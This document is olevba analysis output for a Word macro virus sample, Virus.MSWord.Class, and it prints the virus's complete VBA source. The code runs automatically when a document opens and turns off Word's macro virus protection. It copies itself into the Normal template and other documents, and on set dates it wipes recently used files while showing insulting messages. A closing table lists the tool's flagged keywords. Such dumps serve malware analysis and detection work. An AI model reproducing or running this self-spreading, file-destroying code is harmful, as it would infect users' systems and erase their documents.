olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-4e9fe4e88e223928562ad5020b8a9b4ceaaf5ebe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-4e9fe4e88e223928562ad5020b8a9b4ceaaf5ebe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    On Error Resume Next
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Application.EnableCancelKey = Not -1
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
        .ConfirmConversions = False
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
        .SaveNormalPrompt = False
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Application.DisplayRecentFiles = True
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaClear(bry, "Private Sub Document_Open()")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaClear(bry, "Private Function AkumaClear(DoveM, StartM)")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaClear(bry, "Private Function AkumaInfect()")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaClear(bry, "Sub Document_Open()")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaClear(bry, "Private Sub Document_Close()")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaClear(bry, "Private Function AkumaFind(DoveM, StartM)")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaClear(bry, "Private Function AkumaWrite(StartM)")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaClear(bry, "Sub Document_Close()")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    SetAttr "c:\cont.dbl", vbNormal
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Open "c:\cont.dbl" For Output As #1
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaWrite("Private Sub Document_Close()")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaWrite("Private Function AkumaClear(DoveM, StartM)")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    db = AkumaWrite("Private Function AkumaInfect()")
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    SetAttr "c:\cont.dbl", vbNormal
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Kill "c:\cont.dbl"
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    If Int((6 * Rnd) + 1) < 3 Then
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
            .Title = "Akuma Macro Carrier"
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
            .Keywords = "Mary Bitch"
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
        End With
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    If Left(ActiveDocument.Name, 8) <> "Document" Then
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    End If
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    On Error GoTo 0
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit

'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
'Akuma
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
    If Day(Date) >= 16 And Day(Date) <= 18 Then
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
            For c = 1 To Application.RecentFiles.Count
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
                    Open Application.RecentFiles.Item(c).Path + "\" + Application.RecentFiles.Item(c) For Output As #1
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
                    Close #1
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
            Next c
'Ditry PC12/10/99 2:40:35 PMHP LaserJet 4 on LPT1:sample1.docClippit
            MsgBox "Something wonderful has happened, your PC is alive and even better but some of your documents are infected by the Akuma virus." + Chr$(10) + "Mary is simply a bitch and you, " + Application.UserName + ", are a stupid jerk and lose some files." + Chr$(10) + "Have a nice day."
        End If
    End If
End Sub

Private Function AkumaFind(DoveM, StartM)
'Akuma
    flagaltro = False
    flagio = False
    For Count = 1 To DoveM.CodeModule.CountOfLines
        If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then
            flagaltro = True
            flagio = False
            If Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Akuma" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next Count
    If flagaltro = True Then
        For Count = 1 To DoveM.CodeModule.CountOfLines
            If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then Exit For
        Next Count
        AkumaFind = Count
    Else
        If flagio = False Then
            AkumaFind = "Akuma"
        End If
        If flagio = True Then
            AkumaFind = "Akuma Yes" + Str(Count)
        End If
    End If
End Function

Private Function AkumaClear(DoveM, StartM)
'Akuma
    Count = AkumaFind(DoveM, StartM)
    If Count <> "Akuma" And Count <> "Akuma Yes" Then
        Do Until DoveM.CodeModule.Lines(Count, 1) = "End Sub" Or DoveM.CodeModule.Lines(Count, 1) = "End Function"
            DoveM.CodeModule.DeleteLines (Count)
        Loop
        DoveM.CodeModule.DeleteLines (Count)
    End If
End Function

Private Function AkumaWrite(StartM)
'Akuma
    Count = AkumaFind(MacroContainer.VBProject.VBComponents.Item(1), StartM)
    If Count <> "Akuma" Then
        If Left(Count, Len("Akuma Yes")) = "Akuma Yes" Then
            Count = Val(Right(Count, Len(Count) - Len("Akuma Yes")))
        End If
        Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Sub" Or MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Function"
            stress = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
            Print #1, stress
            Count = Count + 1
        Loop
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
        Print #1, ""
    End If
End Function

Private Function AkumaInfect()
'Akuma
    If AkumaFind(NormalTemplate.VBProject.VBComponents.Item(1), "Private Sub Document_Open()") = "Akuma" Then
        Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
        flag = True
    ElseIf AkumaFind(ActiveDocument.VBProject.VBComponents.Item(1), "Private Sub Document_Open()") = "Akuma" Then
        Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
        flag = True
    Else
        flag = False
    End If
    If flag = True Then
        Open "c:\cont.dbl" For Input As #2
        If LOF(2) = 0 Then GoTo cpyvir
        Count = 1
        Do While Not EOF(2)
            Line Input #2, stress
            bry.CodeModule.InsertLines Count, stress
            Count = Count + 1
        Loop
cpyvir: Close #2
    End If
End Function

Sub AutoOpen()
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
On Error GoTo out
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
Options.VirusProtection = False
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
Options.SaveNormalPrompt = False
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
Options.ConfirmConversions = False
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
If nt > 70 And ad > 0 Then GoTo out
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
If nt < 70 Then
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
End If
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
host.CodeModule.AddFromFile ("c:\class.sys")
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
With host.CodeModule
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    For x = 1 To 4
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    .DeleteLines 1
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    Next x
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
End With
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
If nt < 70 Then
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    With host.CodeModule
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    .replaceline 1, "Sub AutoClose()"
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    .replaceline 71, "Sub ToolsMacro()"
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    End With
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
End If
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
With host.CodeModule
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    For x = 2 To 72 Step 2
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
    Next x
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
End With
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
out:
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
End Sub
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
Sub ViewVBCode()
'to6909/10/99 1:51:48 PM\\PS2TO01TA\OKI on NE00:manfrediClippy
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

